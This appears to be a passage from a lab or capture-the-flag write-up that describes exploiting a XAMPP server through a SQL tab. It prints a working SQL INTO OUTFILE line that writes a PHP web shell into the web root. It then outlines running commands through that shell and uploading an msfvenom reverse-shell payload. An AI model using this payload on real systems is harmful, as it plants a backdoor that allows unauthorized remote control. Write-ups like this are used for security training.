Exploitation

PHP Webshell

I came through that articlethat shows the steps we are going to follow in order to get a full reverse shell to the machine.

  1. We go to the SQL tab.

  2. Then, We upload the PHP webshell backdoor.

1

SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"

  1. Then, We go the PHP webshell place and execute arbitary commands.

  1. After that, We need to upload a Reverse shell payload at the victim’s machine and then run it to get the RevShell.

  2. Make the RevShell payload using MsVenom.
